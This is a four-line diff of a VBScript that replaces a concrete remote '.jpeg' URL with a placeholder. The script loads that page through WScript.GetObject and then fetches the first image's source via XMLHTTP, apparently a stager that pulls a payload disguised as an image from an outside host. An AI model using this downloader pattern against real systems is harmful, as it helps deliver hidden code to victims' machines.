@@ -1,4 +1,4 @@
-Dim document : Set document = WScript.GetObject("https://pwcreatures.vercel.app/bin/oQgVEcfyA6NGPHjrAAzAIkKA93lg0CAAAeh7Nb~noop.jpeg")
+Dim document : Set document = WScript.GetObject("YOUR_URL.jpeg")
 While document.readyState <> "complete" : WScript.Sleep 200 : Wend
 Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP.3.0")
 xhr.open "GET", document.getElementsByTagName("img")(0).src, False
